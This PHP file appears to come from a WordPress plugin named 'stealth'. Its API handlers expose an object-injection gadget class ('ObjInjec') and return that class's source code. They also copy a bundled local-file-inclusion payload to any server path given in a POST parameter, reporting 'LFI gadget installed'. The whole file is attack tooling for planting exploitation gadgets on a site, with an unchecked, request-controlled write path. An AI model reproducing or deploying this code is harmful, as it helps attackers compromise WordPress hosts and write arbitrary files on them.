<?php

if (!defined('ABSPATH')) {
    die('not like this...');
}

function stealth_api_gadgets_info() {
    $php_obj_file = STEALTH_PLUGIN_PATH . '/payloads/php_obj.php';
    stealth_json([
        'obj_class_exists'   => class_exists('ObjInjec'),
        'obj_class_code'     => file_exists($php_obj_file) ? file_get_contents($php_obj_file) : '',
        'lfi_payload_exists' => file_exists(STEALTH_PLUGIN_PATH . '/payloads/lfi.php'),
    ]);
}

function stealth_api_gadgets_lfi() {
    $path = isset($_POST['path']) ? $_POST['path'] : '/tmp/lfi.php';

    $source = STEALTH_PLUGIN_PATH . '/payloads/lfi.php';
    if (!file_exists($source)) {
        stealth_json(['error' => 'LFI payload file not found on server'], 500);
    }

    $success = copy($source, $path);

    if ($success) {
        stealth_json([
            'success' => true,
            'path'    => $path,
            'message' => 'LFI gadget installed to ' . $path,
        ]);
    } else {
        stealth_json([
            'success' => false,
            'path'    => $path,
            'message' => 'Could not write to ' . $path . ' – check permissions',
        ], 500);
    }
}
